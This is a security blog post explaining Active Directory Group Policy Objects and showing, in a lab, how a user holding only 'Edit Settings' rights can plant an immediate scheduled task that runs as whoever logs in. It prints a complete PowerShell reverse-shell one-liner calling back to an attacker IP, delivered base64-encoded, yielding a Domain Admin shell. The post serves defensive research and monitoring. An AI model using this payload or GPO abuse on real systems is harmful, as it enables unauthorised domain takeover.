---
title: "GPO - Attack path"
date: 2019-04-23 11:28:42
author: "Pixis"
layout: post
permalink: /gpo-abuse-with-edit-settings/
disqus_identifier: 0000-0000-0000-00ae
cover: assets/uploads/2019/04/gpo_banner.png
description: "This article describes what is a GPO and shows a possible attack path when attacker has modification rights on a GPO applied to users"
tags:
  - "Active Directory"
  - Windows
---

This article describes what is a GPO (Group Policy Object) and shows a possible attack path when attacker has modification rights on a GPO applied to users.

<!--more-->

## Group Policy Object

### Definition

Active Directory has different purpose, one of which is to keep an homogeneous information system. Active Directory allows you to manage all hosts and users on your network. For that purpose, **Group Policy Objects** (GPO) are an indispensable tool.

Concretely, GPOs are sets of rules / actions applied to a well-defined set of objects. A GPO can do many, many things.

[![Example GPO](/assets/uploads/2019/04/example_gpo.png)](/assets/uploads/2019/04/example_gpo.png)

As seen in this screenshot, it's possible to create / modify scripts that will be executed at computer's startup and shutdown, change firewall settings, create scheduled tasks, or even add users in the local administration group. These are just a few examples to show how diverse and powerful GPOs are.

### GPO

A GPO is a set of 2 elements:
* A Container (Group Policy Container - GPC), which is the object registered in the Active Directory, under the group `adsec.local > system > policies`. Each GPO is identified by a domain's unique id.

[![GPC](/assets/uploads/2019/04/gpc.png)](/assets/uploads/2019/04/gpc.png)

This is where GPO creation/modification rights are finely managed, like any object in the Active Directory.

* Files that contain information to be applied to machines or users. These files are present on each domain controller in the network share `\\dc-01.adsec.local\SYSVOL\adsec.local\Policies\` and it is accessible to every authenticated user. One Folder per GPO, the folder name being the unique identifier corresponding to the GPC container.

[![GPO files](/assets/uploads/2019/04/gpo_files.png)](/assets/uploads/2019/04/gpo_files.png)

It is thanks to this network share that all domain accounts can retrieve and update their GPOs.

## Research context

In my crusade in Active Directory, I frequently use [Bloodhound](https://github.com/BloodHoundAD/BloodHound) developed by [@wald0](https://twitter.com/_wald0), [@Harmj0y](https://twitter.com/harmj0y) and [@CptJesus](https://twitter.com/cptjesus), whom I can't thank enough for their work and availability on their slack [BloodHoundHQ](https://bloodhoundgang.herokuapp.com/). 

After watching [@wald0](https://twitter.com/_wald0) and [@CptJesus](https://twitter.com/cptjesus) [talk](https://www.youtube.com/watch?v=0r8FzbOg2YU&list=PL1eoQr97VfJnvOWo_Jxk2qUrFyB-BJh4Y&index=4&t=0s) at [WeAreTroopers](https://www.troopers.de/), I started looking for GPO attack paths. Bloodhound is of great help fot that because it includesan attack path when a domain account has `WriteDacl` rights on a GPO.

[![BloodHound Path](/assets/uploads/2019/04/bh_path.png)](/assets/uploads/2019/04/bh_path.png)

In this diagram, we see a user with a skull, corresponding to a compromised account. This account is member of group with `WriteDacl` rights on a GPO. This GPO finally applies to an Organisation Unit (OU) containing the user in the bottom right corner, target of the attack.

This `WriteDacl` right allows group members to modify concerned GPO ACLs (Access Control List), and can thus change the object's owner. It means that a member of this group can self-proclaim to be the owner, and modify it arbitrarily.

By default, when a GPO is created, few people have the right to modify it. Users can read it (mandatory to be able to apply it) but only the **Domain Admins** and **Enterprise Admins** group have full rights on it. They can modify it (Edit settings), remove it (Delete), and update the access rights (Modify Security).

[![ACL GPO](/assets/uploads/2019/04/ACL_GPO.png)](/assets/uploads/2019/04/ACL_GPO.png)

If an administrator wants to delegate these permissions to a user without adding him to one of the two groups, he can do this via the delegation tab. It is a place that simplifies the rights management on a GPOs. It is quite possible to modify the rights directly at GPC level, but it is much more complex.

[![GPC Rights](/assets/uploads/2019/04/GPC_rights.png)](/assets/uploads/2019/04/GPC_rights.png)

According to the scroll barre, there is a very, very large number of access parameters.

It is therefore easier to go through the GPO management interface to add a user in order to delegate rights:

[![Add User ACL Gpo](/assets/uploads/2019/04/add_user_acl_gpo.png)](/assets/uploads/2019/04/add_user_acl_gpo.png)

Then we indicate the rights we grant him:

[![Edit settings user](/assets/uploads/2019/04/edit_settings_add_user.png)](/assets/uploads/2019/04/edit_settings_add_user.png)

Three choices are proposed, choices which are a preselection that makes life easier for administrators, by modifying very specific rights at GPC level.

[![Edit settings added for user](/assets/uploads/2019/04/settings_added.png)](/assets/uploads/2019/04/settings_added.png)

Now this user is one of the users / groups that have the ultimate rights on this GPO. It is this total control that we appears in BloodHound when an entity has a **WriteDacl** link to a GPO. Indeed, this preset adds the security settings **Modify Owner** and **Modify Permissions** to the user.

[![Write DACL](/assets/uploads/2019/04/writedacl.png)](/assets/uploads/2019/04/writedacl.png)

## "Edit Settings" right

We saw that we have three levels of delegation:

* Read
* Edit Settings
* Edit Settings, delete, modify security

Only the third level is supported in the BloodHound collection process. However, what happens if a user only has the right to modify the GPO, but not the associated ACLs? Since BloodHound does not track this relationship, I wanted to find out.

So I have created an example GPO, called **TestGPO Abuse**, which applies to all users belonging to the **Domain Users** Organizational Unit. As in the previous example, I added the modification right on this GPO to the user **jdoe** (Edit Settings), but he can **not** modify the ACLs (Modify security).

[![Edit Settings for jdoe](/assets/uploads/2019/04/edit_settings_jdoe.png)](/assets/uploads/2019/04/edit_settings_jdoe.png)

## GPOs applied to users

In my research, I also wanted to know what I could do when the GPO only applied to users, not machines. This is why **TestGPO Abuse** only applies to the **Domain Users** OU. It means that all the controllable settings in the **Computer Configuration** part of the GPO will not apply if this GPO is intended for users. Only those in **User Configuration** will.

[![No Computer GPO](/assets/uploads/2019/04/no_computer_gpo.png)](/assets/uploads/2019/04/no_computer_gpo.png)

But concretely, what is available in the GPO settings applied to a user? Much less, but interesting settings anyway!

[![User Example GPO](/assets/uploads/2019/04/user_gpo_example.png)](/assets/uploads/2019/04/user_gpo_example.png)

You can see that  we can install packages, manage login / logout scripts once again, edit local groups and users and scheduled tasks.

## Exploitation via Immediate Scheduled Tasks

We will focus more specifically on the scheduled tasks. It is possible to create scheduled tasks that will run immediately when the GPO is applied to the user.

Let's log in as `jdoe` on a computer so we can create this task.

[![Abuse Task](/assets/uploads/2019/04/abusetask.png)](/assets/uploads/2019/04/abusetask.png)

The author of the task is `jdoe`, but he is not the one who will execute the task when the GPO is applied. It will be executed as the user working on the computer when the GPO is applied. It means that if `msmith` boots up a computer and logs in, the newly created GPO will be applied, and the script will be executed as `msmith`.

In the **Actions** tab, we indicate what will happen when it executes. Here, we use a Powershell reverse-shell so that when it is executed, the target user connect back to attacker and executes a shell.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.20.12",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

This code is encoded in base 64 and sent with the command `powershell -enc <command in base 64>`.

[![Abuse Task Powershell](/assets/uploads/2019/04/abusetask_pwsh.png)](/assets/uploads/2019/04/abusetask_pwsh.png)

Once this task created, when the GPO is applied on a user, for example `support-account` (who is a Domain Administrator in this lab), the code is executed on the host as `support-accout`, and the attacker gains a shell as Domain Admin.

[![Reverse Shell Worked](/assets/uploads/2019/04/re_shell_worked.png)](/assets/uploads/2019/04/re_shell_worked.png)

## Conclusion

The idea of this article is to show that GPOs are a pillar in Active Directory, and must be monitored just as much as many other objects.  An improperly placed permission can allow an attacker to abuse a GPO and  elevate his privileges in the information system.

We took here as an example a scheduled task applied to a user, however there are a large number of possibilities opened by GPOs that can be used to execute code.